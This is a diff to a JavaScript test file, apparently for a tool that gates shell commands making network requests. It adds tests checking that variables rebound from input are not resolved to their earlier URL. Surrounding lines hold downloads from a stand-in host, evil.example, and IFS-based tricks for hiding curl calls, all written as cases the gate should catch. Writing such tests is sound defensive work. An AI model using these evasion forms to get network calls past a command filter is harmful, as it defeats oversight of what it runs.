@@ -97,6 +97,19 @@ test('an output file named by a positional is not a destination', () => {
   gated(sh('lwp-download evil.example/x out.tgz'));
 });
 
+test('a name rebound from input is not its earlier literal', () => {
+  const lit = 'u=https://api.example.com; ';
+  gated(sh(lit + 'read u; curl "$u"'));
+  gated(sh(lit + 'read -r -p "url: " u; curl "$u"'));
+  gated(sh(lit + 'mapfile -t u < urls; curl "$u"'));
+  gated(sh(lit + 'readarray u < urls; curl "$u"'));
+  gated(sh(lit + 'printf -v u "%s" "$1"; curl "$u"'));
+  gated(sh(lit + 'while getopts "u:" u; do curl "$u"; done'));
+  // Rebinding a different name leaves this one resolved.
+  allowed(sh(lit + 'read other; curl "$u"'));
+  allowed(sh(lit + 'curl "$u"'));
+});
+
 test('IFS word splitting is read the way the shell reads it', () => {
   gated(sh('curl${IFS}https://evil.example/x'));
   gated(sh('curl$IFS"https://evil.example/x"'));
